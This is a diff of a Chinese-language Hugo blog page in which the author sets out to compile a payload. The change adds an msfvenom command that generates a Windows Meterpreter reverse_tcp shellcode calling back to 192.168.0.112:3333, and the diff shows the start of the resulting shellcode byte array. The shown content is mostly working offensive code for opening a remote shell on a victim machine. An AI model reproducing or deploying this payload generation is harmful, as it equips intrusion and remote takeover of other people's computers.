@@ -628,7 +628,8 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 <p>那么， 装完之后就可以开始编译了</p>
 <p>我打算编译一个 payload 试试看，嘿嘿</p>
 <p>首先我们先用 <code>msfvenom</code> 生成一段 <code>shellcode</code></p>
-<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#cdcaa9;font-weight:bold">unsigned</span> <span style="color:#cdcaa9;font-weight:bold">char</span> buf[] = 
+<div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=3333 -f c &gt;&gt; shellcode.c
+</code></pre></div><div class="highlight"><pre style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#cdcaa9;font-weight:bold">unsigned</span> <span style="color:#cdcaa9;font-weight:bold">char</span> buf[] = 
 <span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30</span><span style="color:#0086d2">&#34;</span>
 <span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28</span><span style="color:#0086d2">&#34;</span>
 <span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span style="color:#0086d2">&#34;</span>
